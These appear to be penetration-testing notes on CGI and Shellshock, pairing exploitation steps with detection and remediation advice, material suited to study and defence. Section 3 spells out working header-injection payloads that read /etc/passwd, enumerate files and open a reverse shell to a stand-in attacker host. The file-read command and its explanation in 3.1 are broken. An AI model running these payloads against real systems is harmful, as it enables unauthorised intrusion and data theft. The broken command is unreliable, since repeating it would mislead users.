+++
title = 'CGI Applications'
date = 2026-10-30
type = 'notes'
weight = 20
toc = true
tags = ['web', 'web-technologies', 'cgi']
+++

A Common Gateway Interface (CGI) is the mechanism that lets a web server hand a request to an external program and return its output — it is the original “middleware” between the web server, external databases, and information sources. CGI scripts and programs live in the `/cgi-bin/` directory, are typically written in **C, C++, Java, or Perl**, and **run in the security context of the web server** (usually `www-data`, sometimes `root`).

> **2025–2026 context:** CGI is legacy, and that is precisely why it is still exploitable. **Shellshock (CVE-2014-6271) remains in CISA's Known Exploited Vulnerabilities catalog**, with remediation due back in **2022-07-28**, and its **EPSS sits at ~100%** (99.9th percentile) . Active exploitation in 2025–2026 targets **legacy embedded systems — routers, NAS devices, and industrial equipment that never received patches** — and automated scanning for vulnerable CGI endpoints continues unabated . The secondary lesson is that **new CGI-path vulnerabilities are still being disclosed in 2025**: CVE-2025-5145 (Netcore router `cgi-bin` command injection), CVE-2025-30039 (CliniNET `/cgi-bin/...GetActiveSessions.pl` unauthenticated session takeover), and CVE-2025-64446 (FortiWeb `cgi-bin/fwbcgi` path traversal → admin takeover) are all from the same year .

---

## 1. How CGI Turns a Header into an Environment Variable

When the web server invokes a CGI script, it maps the HTTP request into **environment variables**:

| HTTP request element | CGI environment variable |
|---|---|
| `User-Agent` | `HTTP_USER_AGENT` |
| `Referer` | `HTTP_REFERER` |
| `Cookie` | `HTTP_COOKIE` |
| `Host` | `HTTP_HOST` |
| Query string | `QUERY_STRING` |
| Request method | `REQUEST_METHOD` |

The script is then executed with these variables in its environment. If the script — **or any Bash subshell it spawns** — is a vulnerable Bash, those environment variables are parsed by Bash, and that is the entire attack surface.

> **The critical detail that makes CGI the canonical path:** the script does not have to use the header. Even a CGI script that prints “hello world” is exploitable if it **shells out to Bash anywhere**, because Bash imports the environment at startup, before the script's own logic runs .

---

## 2. Shellshock — CVE-2014-6271

**Affected:** GNU Bash **1.14 through 4.3** — effectively every Bash release since 1989, across every major Linux distribution, BSD variant, macOS through Yosemite, and a long tail of routers, NAS devices, and IoT firmware .

**CVSS:** 10.0 (CVSSv2), 9.8 (CVSSv3.1) — unauthenticated, network-reachable, complete compromise .

### 2.1 The parsing flaw

Bash exports shell functions through environment variables so child processes can inherit them. A function definition looks like:

```bash
VAR='() { echo vulnerable; }'
```

Vulnerable Bash does **not stop parsing** at the closing brace. It treats everything that follows as shell commands and **executes it immediately**, before the program that set the variable ever runs :

```bash
() { :; }; echo "attacker-controlled command executed"
```

The `:;` is a no-op, so the function body does nothing. The payload is the trailing text after the closing brace.

### 2.2 The canonical PoC

```bash
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

- **Vulnerable:** prints `vulnerable-shellshock`, then `not vulnerable` .
- **Patched:** prints only `not vulnerable` — Bash no longer executes code after a function definition and no longer interprets `y=() {...}` as a function definition; function exports now require a `BASH_FUNC_` prefix .

### 2.3 The follow-on CVE cluster

The first patch was **incomplete**. Tavis Ormandy bypassed it within days, and four more CVEs surfaced in the same week :

| CVE | Nature |
|---|---|
| **CVE-2014-7169** | Bypass of the first patch — still allowed file writes |
| **CVE-2014-6277 / 6278** | Additional arbitrary-command-execution paths in the same parser |
| **CVE-2014-7186 / 7187** | Out-of-bounds memory access in redirection and here-document handling |

> **Practical consequence:** a host patched only against CVE-2014-6271 may still be vulnerable to the later parser flaws. Check the Bash **version and package release**, not just the presence of one patch.

---

## 3. Exploitation

### 3.1 File read

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' \
  bash -s :'' http://target.com/cgi-bin/access.cgi
```

The `echo ; echo ;` prefix emits two newlines so the command output is not absorbed into the CGI headers. The `bash -s :''` invokes Bash on the response with an empty argument, which forces the response body to be processed .

### 3.2 Reverse shell

```bash
# Listener
nc -lvnp 4444

# Trigger
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' \
  http://target.com/cgi-bin/access.cgi
```

The command runs with the **web server's privileges** — `www-data` in most cases, `root` when the CGI handler runs elevated .

### 3.3 Filesystem enumeration

```bash
# Directory listing
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/ls -la /' \
  http://target.com/cgi-bin/access.cgi

# Locate a flag or config file
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/find / -name "flag.txt" 2>/dev/null' \
  http://target.com/cgi-bin/access.cgi

# Read it
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /path/to/flag.txt' \
  http://target.com/cgi-bin/access.cgi
```

### 3.4 Alternative injection vectors

The `User-Agent` header is the most common, but **every** request element that becomes an environment variable is a candidate :

| Vector | Example |
|---|---|
| **`Referer`** | `-H 'Referer: () { :; }; /bin/id'` |
| **`Cookie`** | `-H 'Cookie: () { :; }; /bin/id'` |
| **`Host`** | `-H 'Host: () { :; }; /bin/id'` |
| **Query string** | `?x=() { :; }; /bin/id` — only when the CGI wrapper passes it to Bash |
| **`Accept` / custom headers** | Any header the CGI script forwards |

> **Why multiple vectors matter:** a WAF rule that blocks `() {` in `User-Agent` may not inspect `Cookie` or a custom header. Test each one independently.

### 3.5 Beyond CGI — the same primitive elsewhere

Shellshock is not CGI-specific. The same environment-variable injection reaches **OpenSSH `ForceCommand` and `AcceptEnv`**, **DHCP clients** (`dhclient`), **qmail**, **Git and Subversion hooks**, and **CUPS** .

---

## 4. Detection and Enumeration

### 4.1 Find CGI scripts

```bash
# Directory brute-force with the .cgi extension
gobuster dir -u http://target/cgi-bin \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
  -x cgi
```

### 4.2 Nmap — `http-shellshock`

```bash
nmap -n -p80 --script http-shellshock \
  --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56
```

> The script name is `http-shellshock` (not `http-shershock`). It is the fastest confirmation against a known CGI path .

### 4.3 Metasploit

```text
use multi/http/apache_mod_cgi_bash_env_exec
```

### 4.4 Dedicated scanners

| Tool | Notes |
|---|---|
| **`shellshocker.py`** (`erinzm/shellshocker`) | Python detector — `shellshocker.py [OPTIONS] URL`  |
| **`CVE-2014-6271` Python PoC** (`im2sinister`) | Interactive, header-injection based |
| **`R3fr4kt/Shocker-TJNULL-OSCP`** | Full HTB Shocker walkthrough — CGI fuzzing → Shellshock → Perl `sudo` GTFOBins escalation  |

### 4.5 False-positive handling

Some CGI endpoints respond with `500` to every malformed request, which produces a false positive if the only signal you check is “the server returned 500.” **Confirm exploitation by reading a file you know exists** (`/etc/passwd`) rather than by status code alone.

---

## 5. Recent CGI-Path Vulnerabilities (2025)

Shellshock is not the only CGI bug class — the `/cgi-bin/` path itself remains a live attack surface in network appliances.

| CVE | Product | Primitive |
|---|---|---|
| **CVE-2025-5145** | Netcore NBR1005GPEV2, B6V2, COVER5, NAP830, NAP930, NBR100V2, NBR200V2, POWER13 (≤ 20250508) | **Command injection** in `/www/cgi-bin/` query-string handler — remotely exploitable, public exploit  |
| **CVE-2025-30039** | CliniNET | **Unauthenticated** `/cgi-bin/CliniNET.prd/GetActiveSessions.pl` → session takeover of **any** user, including admin  |
| **CVE-2025-30040** | CliniNET | Unauthenticated `/cgi-bin/CliniNET.prd/utils/userlogxls.pl` → download session-ID data  |
| **CVE-2025-64446** | FortiWeb | Path traversal in the GUI API → **`cgi-bin/fwbcgi`** → full admin takeover, exploited in the wild  |
| **CVE-2025-14586** | TOTOLINK X5000R | `cstecgi.cgi` `snprintf` privilege escalation  |

> **The pattern:** these are **not** Shellshock. They are direct command-injection, authentication-bypass, and path-traversal bugs **in the CGI handler itself** — which is why `/cgi-bin/` enumeration is still worth doing on any network appliance or embedded device, regardless of Bash version.

### 5.1 The 2026 twist — PHP-CGI

On **21 October 2026**, the PHP project released emergency updates for **CVE-2026-109618** and **CVE-2026-109619**, affecting **PHP-FPM, Apache `mod_php`, `php-cgi`, FrankenPHP, and LiteSpeed**. The PHP team rates `mod_php` the highest risk, with a demonstrated path that **fires before any application code runs** .

> **The lesson for CGI testing:** the interface is not the vulnerability — the **interpreter** is. Shellshock is a Bash-interpreter bug exposed through CGI; the 2026 PHP bugs are the same shape, one interpreter over.

---

## 6. Tooling

| Tool | Purpose |
|---|---|
| **`nmap --script http-shellshock`** | Fastest confirmation against a known CGI path |
| **`shellshocker.py`** | Standalone Python detector |
| **Metasploit `multi/http/apache_mod_cgi_bash_env_exec`** | Detection and exploitation |
| **`gobuster dir -x cgi`** | Discover CGI scripts |
| **Burp Suite** | Inject `() { :; };` into `User-Agent`, `Referer`, `Cookie` — Repeater is sufficient |
| **`curl`** | The PoC commands in §3 |
| **Nuclei** | `http/cves/2014/CVE-2014-6271.yaml` — template-based detection at scale |

---

## 7. Detection and Remediation (Defender Perspective)

### 7.1 Detection

| Signal | Where |
|---|---|
| **`() {` in a request header** | WAF / IDS — Snort and Suricata signatures (`1:31978`, "Bash CGI environment variable injection attempt") existed within hours of disclosure  |
| **`BASH_FUNC_` prefix in a header** | A post-patch Shellshock attempt — the attacker adapts the payload to the new export format |
| **`/cgi-bin/` access to a `.cgi`/`.sh`/`.pl` path** | Web server logs — CGI endpoints should be a small, known set  |
| **`http-shellshock` Nmap scan** | `nmap` user-agent or script signature |
| **Unexpected child process of the web server** | EDR — `www-data` spawning `bash`, `curl`, `wget`, `nc` |

> **WAF signatures are noisy.** Shellshock payloads look like legitimate text in headers, which produces false positives and “knocked-out” rules . A WAF is a stopgap, not a fix.

### 7.2 Remediation

1. **Patch Bash.** The complete fix redesigned Bash's environment-variable function-import mechanism — verify the **package release**, not just the version string .
2. **Disable CGI if not needed.** Remove `mod_cgi` / `mod_cgid`, or restrict it to a known directory .
3. **Replace Bash CGI scripts** with Python, PHP, or Perl interpreters .
4. **Never let untrusted input reach an environment variable** that a shell will parse. This is the durable fix — CGI, SSH `ForceCommand`, DHCP, and mail all share the same primitive.
5. **Restrict reachability** — keep management and CGI surfaces off the public internet .
6. **Hunt for prior compromise** on legacy appliances — Shellshock has been mass-exploited since 2014, and an unpatched device may already be backdoored .

---

## 8. Field Notes

- **Shellshock is still in CISA KEV, with EPSS ~100%.** It is not a museum piece — it is a live risk on unmapped legacy appliances .
- **CGI is the canonical path, but not the only one.** OpenSSH `ForceCommand`, DHCP clients, and mail servers expose the same environment-variable parsing .
- **The first patch was incomplete.** CVE-2014-7169 bypassed it, and CVE-2014-6277/6278/7186/7187 are the same parser. Check the full patch level .
- **The `User-Agent` is the default vector, not the only vector.** `Referer`, `Cookie`, and custom headers bypass WAF rules that only inspect `User-Agent` .
- **`nmap --script http-shellshock` is the fastest confirmation.** It takes one command and returns a definitive answer .
- **`/cgi-bin/` is still a live attack surface in 2025 — independently of Bash.** CVE-2025-5145, CVE-2025-30039, and CVE-2025-64446 are all direct CGI-handler bugs, not Shellshock .
- **The 2026 PHP-CGI bugs confirm the pattern.** The interface is not the vulnerability — the **interpreter** is. `php-cgi`/`mod_php` RCE before application code runs is Shellshock's shape, one interpreter over .
- **A 500 response is not proof of exploitation.** Confirm by reading `/etc/passwd`, not by status code — some CGI endpoints return 500 for every malformed request.
- **Disabling CGI is the single highest-value mitigation.** If the application does not need it, the entire class disappears .
